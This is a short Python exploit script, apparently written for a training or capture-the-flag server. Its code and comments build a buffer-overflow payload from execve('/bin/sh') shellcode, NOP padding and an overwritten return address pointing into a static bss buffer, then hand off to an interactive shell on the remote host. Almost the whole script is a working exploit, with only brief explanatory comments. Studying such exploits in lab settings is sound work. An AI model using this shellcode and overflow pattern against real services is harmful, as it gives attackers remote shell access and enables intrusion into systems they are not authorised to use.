from pwn import *

context.terminal = ['tmux', 'splitw','-h'] #spawn a terminal, tmux in this case, splitted in two screen

#r = remote("training.jinblack.it", 2001) #connects to a remote program
r = remote("training.jinblack.it", 2001)

#print(r.recv(1024))  #receiving only 1024 bytes
print(r.recvuntil("name?\n"))  #receiving until the string NAME? is found

buffer_address = 0x00601080 #with ghidra or gdb i can see the static address of buffer from bss (global variables)
shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode.ljust(200, b"\x90")
shellcode = shellcode + b"/bin/sh\x00" +b"\x00" * 8

payload = shellcode.ljust(1016, b"\x90") + p64(buffer_address) #be careful of the endianess of addresses // the b means that \x90 is not a string but a byte (byte != string)

r.send(payload)

r.interactive() #spwns a shell to interact with the remote program

